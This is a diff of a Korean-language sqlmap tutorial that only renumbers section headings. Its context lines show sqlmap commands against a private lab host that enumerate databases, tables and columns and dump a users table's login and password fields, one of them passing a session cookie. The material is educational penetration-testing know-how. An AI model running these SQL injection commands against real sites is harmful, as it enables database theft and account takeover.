@@ -36,7 +36,7 @@ apt-get install sqlmap -y
 
 ## 0x02. 사용법
 
-### (1) 도움말
+### 1. 도움말
 
 다음 명령어를 통해서 `sqlmap`에 대한 도움말을 볼 수 있다.(보다 자세한 도움말을 보려면 `sqlmap -hh`)
 
@@ -157,7 +157,7 @@ SQL Injection 취약점이 존재하면 실제 관리자 계정 탈취까지 가
 
 
 
-### (1) GET 방식 입력 값 점검
+### 1. GET 방식 입력 값 점검
 
 다음 명령어를 이용하여 GET방식의 입력값 점검을 할 수 있다.
 
@@ -192,7 +192,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbms=mysql
 
 
 
-#### 데이터베이스 목록 조회
+#### 1.1. 데이터베이스 목록 조회
 
 다음 명령어를 통해 데이터베이스의 목록을 조회할 수 있다.
 
@@ -206,7 +206,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbs
 
 
 
-##### 쿠키값이 필요할 경우(사용 예시)
+##### 1.1.1. 쿠키값이 필요할 경우(사용 예시)
 
 ```
 sqlmap -u "http://192.168.23.131/cat.php?id=1" --cookie="security=low; PHPSESSID=letmado2cqoj2vd2i0873168h5; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs
@@ -216,7 +216,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" --cookie="security=low; PHPSESSID
 
 
 
-#### 테이블 목록 조회
+#### 1.2. 테이블 목록 조회
 
 데이터베이스의 이름을 알아내었으니 해당 데이터베이스의 테이블 목록을 조회해보자.
 
@@ -230,7 +230,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog --tables
 
 
 
-#### 컬럼 목록 조회
+#### 1.3. 컬럼 목록 조회
 
 회원정보는 users 테이블에 저장되어 있을 것이라고 추정가능 하기에 users 테이블의 칼럼 목록을 조회한다.
 
@@ -246,7 +246,7 @@ users 테이블은 id, login, password 3개 컬럼(column)으로 구성되어 �
 
 
 
-#### 테이블 내용 덤프
+#### 1.4. 테이블 내용 덤프
 
 users테이블의 모든 내용들을 덤프해보자.
 
@@ -274,7 +274,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users -C "login,p
 
 
 
-### (2) POST 방식 입력 값 점검
+### 2. POST 방식 입력 값 점검
 
 ![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/8.png){:.border.rounded}
 
